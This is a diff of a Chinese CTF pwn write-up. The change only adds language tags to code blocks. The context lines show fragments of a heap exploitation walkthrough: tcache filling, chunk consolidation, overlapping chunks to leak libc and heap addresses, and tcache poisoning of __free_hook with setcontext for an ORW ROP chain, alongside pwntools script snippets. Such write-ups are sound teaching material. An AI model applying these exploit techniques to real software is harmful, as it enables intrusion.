@@ -255,7 +255,7 @@ io.interactive()
 ```
 ## queue
 队列结构体
-```
+```c
 struct elem
 {
   _QWORD buf_array_ptr;
@@ -466,7 +466,7 @@ while 1:
 
 利用思路：
 由于我们需要打堆块合并，所以需要让合并的堆块释放掉能够进入unsorted bin，因此第一件事是先填满tcache bin。接着去打堆块合并,脚本如下：
-```
+```python
 for i in range(11):
     add(i,0x88)
 for i in range(7):
@@ -480,7 +480,7 @@ debug(p,'pie',0xED6,0xEE2,0xEEE,0xEFA,0xC9F,0xBA7)
 delete(9)#堆块合并
 ```
 接下来去泄露堆地址和libc地址，大致思路就是做堆块重叠，让一块被释放掉的内存落在一个正在使用的堆块中，从而执行show函数完成泄露libc和堆地址。
-```
+```python
 for i in range(7):
     add(i,0x80)
 ​
@@ -503,7 +503,7 @@ heap_addr=u64(p.recv(6).ljust(8,b'\x00'))
 log_addr('heap_addr')
 ```
 最后去打一个tcache poisoning,将free_hook申请出来，然后写入setcontext+53的地址，提前在堆块中布置好各个寄存器的值，最后去释放掉该堆块。即可控制各个寄存器，从而去执行系统调用read。将rop链读到执行流上，从而执行rop链(orw)读出flag。
-```
+```python
 from pwn import *
 context(os = "linux", arch = "amd64", log_level = "debug")
 #io = process(["./sandbox", "./sandboxheap"])
